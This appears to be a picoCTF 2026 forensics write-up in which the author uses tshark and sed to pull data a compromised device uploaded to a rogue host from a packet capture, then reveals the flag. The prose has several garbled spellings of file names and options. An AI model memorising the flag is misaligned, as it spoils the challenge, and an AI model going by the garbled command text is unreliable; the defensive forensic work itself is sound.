# 🚩Rogue Tower - picoCTF 2026

- **Category:** Forensics ⚙️
- **Difficulty:** Medium 
- **Target File:** `rogue_tower.pcap`
- **Key Skills And Tools:** strings, reading data
---

## 🔍 Challenge 

A suspicious cell tower has been detected in the network. Analyze the captured network traffic to identify the rogue tower, find the compromised device, and recover the exfiltrated flag.

Download the network capture file: here

### 🧪 Logic Extraction:

I used the `tshark` command, the command-line version of Wireshark, to analyze packets. `-r rogue_tơer.pcap` specified the network file data to read, `-q` instructed `tshark` not to print the details of each packet but to focus on outputting the aggregated data based on the parameter `-z follow,tcp,ácii,5`. This is the most important command; it instructs `tshark` to follow the TCP stream. `ascii` formatted the displayed data as plain text (instead of hex), and `5` was the Stream Index requesting the extraction of the content of TCP stream 5. `sed -n '8,$P'`, `sed` is a text processing tool, and `-n '8, $p'` tells `sed` to skip the first 7 lines, usually the headers of `tshark`, and start printing from the 8th line to the last line. (`$`) of the data and it prints out the HTTP POST request and the data sent to the endpoint "/pload" and Payloda is the string `Q15TWnpif` and these are the strings we will use for the following encoding.

```   
┌──(kali㉿kali)-[~/Tools/CTF1]
└─$ tshark -r rogue_tower.pcap -q -z follow,tcp,ascii,5 | sed -n '8,$p'
POST /upload HTTP/1.1
Host: 198.51.100.247
Content-Type: application/octet-stream
Content-Length: 9

Q15TWnpif
===================================================================
                                                                                                                                                           
┌──(kali㉿kali)-[~/Tools/CTF1]
└─$ tshark -r rogue_tower.pcap -q -z follow,tcp,ascii,6 | sed -n '8,$p'
POST /upload HTTP/1.1
Host: 198.51.100.247
Content-Type: application/octet-stream
Content-Length: 9

kxBB1dACm
===================================================================
                                                                                                                                                           
┌──(kali㉿kali)-[~/Tools/CTF1]
└─$ tshark -r rogue_tower.pcap -q -z follow,tcp,ascii,7 | sed -n '8,$p'
POST /upload HTTP/1.1
Host: 198.51.100.247
Content-Type: application/octet-stream
Content-Length: 9

lbBF9bb0E
===================================================================
                                                                                                                                                           
┌──(kali㉿kali)-[~/Tools/CTF1]
└─$ tshark -r rogue_tower.pcap -q -z follow,tcp,ascii,8 | sed -n '8,$p'
POST /upload HTTP/1.1
Host: 198.51.100.247
Content-Type: application/octet-stream
Content-Length: 9

JQQtFbAQB
===================================================================
                                                                                                                                                           
┌──(kali㉿kali)-[~/Tools/CTF1]
└─$ tshark -r rogue_tower.pcap -q -z follow,tcp,ascii,9 | sed -n '8,$p'
POST /upload HTTP/1.1
Host: 198.51.100.247
Content-Type: application/octet-stream
Content-Length: 9

BQ1QXAEAS
===================================================================
                                                                                                                                                           
┌──(kali㉿kali)-[~/Tools/CTF1]
└─$ tshark -r rogue_tower.pcap -q -z follow,tcp,ascii,10 | sed -n '8,$p'
POST /upload HTTP/1.1
Host: 198.51.100.247
Content-Type: application/octet-stream
Content-Length: 3

g==
===================================================================

```


<div align="center">
  <img width="925" height="580" alt="image" src="https://github.com/user-attachments/assets/4c4f94af-6993-41bf-a54e-099022e5e3b1" />

</div>

#
<div align="center">
   <img width="1059" height="613" alt="image" src="https://github.com/user-attachments/assets/61331733-d467-473b-8db9-2e213a6347d0" />

</div> 

## Run 
.flag picoCTF{d3l_d0n7_h1d3_w3ll_4b0a805d}



